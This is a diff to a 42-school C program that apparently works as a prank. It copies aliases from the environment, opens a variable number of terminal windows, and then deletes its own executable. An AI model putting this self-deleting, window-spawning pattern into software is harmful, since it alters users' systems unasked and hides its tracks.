@@ -6,11 +6,12 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/25 14:37:33 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/25 15:15:56 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "../utils/process.h"
+#include "../utils/time.h"
 
 int	copy_alias(char **envp)
 {
@@ -41,17 +42,22 @@ int	copy_alias(char **envp)
 
 int	main(int ac, char **av, char **envp)
 {
+	int		i;
 	char	home_buffer[PATH_MAX];
 	char	*rm_cmd[] = {"open", "-a", "Terminal", NULL};
 
 	realpath(av[0], home_buffer);
 	printf("currrent file path = %s\n", home_buffer);
 	copy_alias(envp);
+	i = -1;
+	while (++i < ft_abs_time() % 10)
+	{
 #if __APPLE__
-	process_child(rm_cmd, envp);
+		process_child(rm_cmd, envp);
 #else
-	system("gnome-terminal");
+		system("gnome-terminal");
 #endif /* __APPLE__ */
+	}
 	if (remove(home_buffer) < 0)
 		dprintf(2, "Could not remove file %s", home_buffer), perror("");
 	return (0);
